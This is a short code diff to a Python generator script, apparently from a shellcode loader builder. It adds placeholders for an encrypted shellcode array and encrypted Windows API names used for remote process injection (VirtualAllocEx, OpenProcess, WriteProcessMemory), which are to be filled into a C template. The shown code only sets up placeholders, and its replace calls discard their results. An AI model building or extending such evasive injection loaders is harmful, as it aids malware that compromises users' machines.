@@ -173,6 +173,18 @@ def generate(path2shell,path2template,pathout):
 
 	key_place = 'unsigned char key = "place_key";'
 	key2_place = 'unsigned char key2 = "place_key2";'
+	shift_place = 'int shift = "place_shift";'
+	shellcode_place = 'unsigned char shellcode[] = "place_shellcode";'
+	vallockey_place = 'unsigned char vallocx_key[] = "place_vallocx_key";'
+	openprockey_place = 'unsigned char open_proc_key[] = "place_open_proc_key";'
+	writeprockey_place = 'unsigned char write_proc_key[] = "place_write_proc_key";'
+	closehandlekey_place = 'unsigned char close_handle_key[] = "place_close_handle_key";'
+	kernelkey_place = 'unsigned char kernel32_key[] = "place_kernel32_key";'
+	valloc_place ='unsigned char vallocex[] = "place_vallocex";'
+	openprc_place = 'unsigned char openPRC[] = "place_openPRC";'
+	writeprc_place = 'unsigned char writePRC[] = "place_writePRC";'
+	handle_place = 'unsigned char closeHandle[] = "place_closeHandle";'
+	kernel_place = 'unsigned char kernel32[] = "place_kernel32";'
 
 
 
@@ -183,6 +195,7 @@ def generate(path2shell,path2template,pathout):
 
 	template.replace(key_place, key)
 	template.replace(key2_place, key2)
+	template.replace(shift_place, shift)
 
 
 
